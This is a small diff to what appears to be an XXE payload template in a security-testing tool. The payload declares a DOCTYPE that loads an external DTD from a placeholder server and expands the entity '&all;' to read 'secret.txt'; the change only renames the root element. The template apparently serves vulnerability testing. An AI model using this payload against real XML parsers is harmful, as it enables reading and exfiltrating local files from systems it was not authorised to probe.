@@ -11,5 +11,5 @@ path: secret.txt
 content: doctype-pe.dtd
 log-request: no
 -->
-<!DOCTYPE data SYSTEM "http://{server_address}/doctype-pe.dtd">
-<data>&all;</data>
+<!DOCTYPE root SYSTEM "http://{server_address}/doctype-pe.dtd">
+<root>&all;</root>
